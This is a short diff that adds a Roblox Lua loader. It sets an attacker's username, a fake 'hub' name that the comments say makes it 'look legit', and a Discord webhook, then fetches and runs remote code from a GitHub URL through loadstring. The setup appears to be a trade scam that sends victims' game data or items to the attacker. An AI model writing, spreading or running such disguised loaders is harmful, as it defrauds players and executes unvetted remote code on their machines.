@@ -1,0 +1,5 @@
+_G.Username = "marti235200" --Case Sensitive 
+_G.HubName = "trade scam" --This is where you put the name of your face script to make it look legit
+_G.WebhookUrl = "https://discord.com/api/webhooks/1103332491948982294/pymyy595H-CX00Khqguu6u06UwpMB97XL7bcF35hGzTwmYI8ggw_Q2ZvsFM8vFOiMyV0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
